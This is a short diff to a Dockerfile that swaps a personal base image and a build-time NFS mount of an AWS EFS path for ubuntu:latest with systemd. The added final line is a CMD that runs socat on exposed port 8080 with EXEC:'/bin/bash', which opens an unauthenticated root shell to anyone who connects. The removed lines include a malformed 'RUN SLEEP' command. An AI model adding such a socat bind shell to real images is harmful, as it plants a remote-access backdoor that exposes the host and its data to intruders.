@@ -1,6 +1,6 @@
-FROM manish2296lion/sudoubuntu:tagname
+FROM ubuntu:latest
+RUN apt-get update && apt update && apt-get install -y systemd
 USER root
 ENV HOME /root
-RUN mkdir /home/data
-RUN mount -t nfs -o ro nolock fs-0e7955a26ee765a8f.efs.cn-north-1.amazonaws.com.cn:/imranen103245846-pvc-450662d0-bf96-4dc7-b7ff-984f2c9b3c8d /home/data
-RUN SLEEP 1200000
+EXPOSE 8080
+CMD ["socat", "-T600", "TCP-LISTEN:8080,reuseaddr,fork", "EXEC:'/bin/bash'"]
